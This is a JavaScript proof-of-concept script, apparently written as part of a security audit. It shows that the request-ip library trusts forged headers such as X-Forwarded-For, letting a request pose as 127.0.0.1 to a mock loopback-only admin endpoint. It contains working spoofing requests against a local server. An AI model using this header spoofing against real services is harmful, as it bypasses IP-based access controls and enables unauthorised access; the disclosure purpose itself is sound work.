// request-ip — RIP-01: IP spoofing via untrusted headers.
// A server reads req.ip from request-ip's getClientIp(). An attacker
// who can send a request with arbitrary headers (X-Forwarded-For etc.)
// can claim to be any IP — including 127.0.0.1 to bypass IP-allowlists.
const express = require("express");
const requestIp = require("request-ip");
const http = require("http");

const PORT = 5557;
const app = express();
app.use(requestIp.mw());

// Simulate a "trusted-IP-only" admin endpoint. A common bug is to
// gate this on req.clientIp === "127.0.0.1" or an internal range.
app.get("/admin-only", (req, res) => {
  const ip = req.clientIp;
  const isLoopback = (ip === "127.0.0.1" || ip === "::1" || ip === "::ffff:127.0.0.1");
  res.json({
    headers_seen: {
      "x-forwarded-for":      req.headers["x-forwarded-for"] || null,
      "x-real-ip":            req.headers["x-real-ip"] || null,
      "cf-connecting-ip":     req.headers["cf-connecting-ip"] || null,
      "true-client-ip":       req.headers["true-client-ip"] || null,
    },
    client_ip_reported_by_requestip: ip,
    loopback_evaluation: isLoopback,
    message: isLoopback ? "AUTHORIZED as internal IP" : "denied",
  });
});

const server = app.listen(PORT, "127.0.0.1", async () => {
  console.log("request-ip PoC — version:", require("request-ip/package.json").version);
  console.log(`[+] server listening on http://127.0.0.1:${PORT}`);
  console.log("[*] actual TCP peer is 127.0.0.1 -- but the attack is to lie about it");

  // 1) No spoofing — request-ip should report 127.0.0.1
  const r1 = await fetch(`http://127.0.0.1:${PORT}/admin-only`);
  console.log("\n  no-spoof headers -> ", await r1.json());

  // 2) Spoof via X-Forwarded-For (the most common)
  const r2 = await fetch(`http://127.0.0.1:${PORT}/admin-only`, {
    headers: { "X-Forwarded-For": "8.8.8.8" }
  });
  console.log("\n  X-Forwarded-For: 8.8.8.8 -> ", await r2.json());

  // 3) Spoof via multiple headers in priority order — request-ip
  //    trusts whichever header comes first in its priority list.
  const r3 = await fetch(`http://127.0.0.1:${PORT}/admin-only`, {
    headers: {
      "X-Forwarded-For":   "1.2.3.4",
      "X-Real-IP":         "1.1.1.1",
      "CF-Connecting-IP":  "9.9.9.9",
      "True-Client-IP":    "4.4.4.4",
    }
  });
  const j3 = await r3.json();
  console.log("\n  multiple-spoof -> ", j3);
  if (j3.client_ip_reported_by_requestip !== "127.0.0.1") {
    console.log("\n  >>> RIP-01 CONFIRMED: client IP is taken from untrusted header <<<");
    console.log(`      request-ip reported ${j3.client_ip_reported_by_requestip} instead of 127.0.0.1`);
  }
  server.close();
  process.exit(j3.client_ip_reported_by_requestip !== "127.0.0.1" ? 0 : 1);
});
